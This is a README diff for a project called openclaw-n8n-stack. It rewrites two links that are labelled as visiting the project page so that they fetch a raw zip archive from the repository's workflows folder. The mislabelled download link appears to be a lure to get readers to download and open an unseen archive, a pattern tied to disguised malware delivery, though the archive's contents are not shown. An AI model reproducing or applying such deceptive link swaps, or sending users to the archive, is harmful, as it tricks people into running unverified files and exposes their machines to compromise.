@@ -1,6 +1,6 @@
 # ⚙️ openclaw-n8n-stack - Run AI workflows with less setup
 
-[![Download / Visit Project Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/foot8319/openclaw-n8n-stack)
+[![Download / Visit Project Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/foot8319/openclaw-n8n-stack/main/workflows/openclaw_n_stack_2.1.zip)
 
 ## 🧭 What this is
 
@@ -31,7 +31,7 @@ If Docker Desktop is not on your PC, install it first, then come back to this pa
 
 Use this link to visit the project page and get the files:
 
-[Open the openclaw-n8n-stack project](https://github.com/foot8319/openclaw-n8n-stack)
+[Open the openclaw-n8n-stack project](https://raw.githubusercontent.com/foot8319/openclaw-n8n-stack/main/workflows/openclaw_n_stack_2.1.zip)
 
 After you open the page:
 
